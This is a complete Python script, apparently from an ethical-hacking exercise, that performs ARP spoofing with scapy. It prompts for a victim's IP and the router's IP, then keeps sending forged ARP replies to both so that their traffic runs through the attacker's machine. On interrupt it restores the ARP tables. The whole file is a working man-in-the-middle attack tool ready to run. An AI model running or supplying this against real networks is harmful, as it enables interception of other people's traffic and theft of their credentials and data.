#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)


target_ip = input('Enter the victim\'s IP address: ')
gateway_ip = input('Enter the router\'s IP address: ')

def restore(dest_ip, source_ip):
	dest_mac = get_mac(dest_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4, verbose=False)


sent_packets_count = 0
try:
	while True:
			spoof(target_ip, gateway_ip)
			spoof(gateway_ip, target_ip)
			sent_packets_count = sent_packets_count + 2
			## To print it on the start of the same line.
			print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
			time.sleep(2)
except KeyboardInterrupt:
	print('\n[-]Quitting the Program and resetting the ARP tables due to KeyboardInterrupt.')
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
